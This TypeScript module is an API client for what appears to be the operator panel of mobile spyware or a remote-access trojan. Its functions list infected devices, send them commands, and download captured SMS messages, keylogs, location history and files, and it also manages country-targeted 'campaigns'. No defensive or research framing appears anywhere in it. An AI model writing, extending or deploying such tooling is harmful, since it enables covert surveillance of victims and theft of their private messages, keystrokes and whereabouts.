import axios from 'axios'

const api = axios.create({ baseURL: '/api', timeout: 15000 })

api.interceptors.request.use(cfg => {
  const token = localStorage.getItem('token')
  if (token) cfg.headers.Authorization = `Bearer ${token}`
  return cfg
})

api.interceptors.response.use(
  r => r,
  err => {
    if (err.response?.status === 401) {
      localStorage.removeItem('token')
      window.location.href = '/login'
    }
    return Promise.reject(err)
  }
)

export const devices = {
  list: (page = 0, limit = 50) => api.get('/devices', { params: { page, limit } }),
  get: (id: string) => api.get(`/devices/${id}`),
  command: (id: string, type: number, params: Record<string, string> = {}) =>
    api.post(`/devices/${id}/command`, { type, params })
}

export const sms = {
  list: (deviceId: string) => api.get(`/data/sms/${deviceId}`)
}

export const keylogs = {
  list: (deviceId: string) => api.get(`/data/keylogs/${deviceId}`)
}

export const location = {
  history: (deviceId: string) => api.get(`/data/location/${deviceId}`)
}

export const files = {
  list: (deviceId: string) => api.get(`/data/files/${deviceId}`),
  download: (deviceId: string, fileId: string) =>
    api.get(`/data/files/${deviceId}/${fileId}`, { responseType: 'blob' })
}

export const campaigns = {
  list: () => api.get('/campaigns'),
  create: (name: string, country: string) => api.post('/campaigns', { name, country })
}

export const auth = {
  login: (username: string, password: string) => api.post('/auth/login', { username, password })
}

export default api
